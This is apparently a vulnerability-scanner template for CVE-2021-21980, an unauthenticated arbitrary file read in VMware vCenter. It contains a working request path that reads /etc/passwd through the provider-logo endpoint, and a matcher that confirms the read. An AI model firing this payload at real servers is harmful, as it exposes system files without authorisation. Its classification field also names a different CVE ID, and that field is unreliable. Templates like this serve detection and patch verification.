id: CVE-2021-21980

info:
  name: VMware vCenter - Unauthorized arbitrary file read
  author: madrobot
  severity: high
  description: The vSphere Web Client (FLEX/Flash) contains an unauthorized arbitrary file read vulnerability. A malicious actor with network access to port 443 on vCenter Server may exploit this issue to gain access to sensitive information.
  reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-21980
  tags: cve,cve2021,vmware,file-read,lfi
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.50
    cve-id: CVE-2021-43495
    cwe-id: CWE-22

requests:
  - method: GET
    path:
      - '{{BaseURL}}/ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=file:///etc/passwd'

    matchers:
      - type: regex
        regex:
          - "root:.*:0:0:"
        part: body
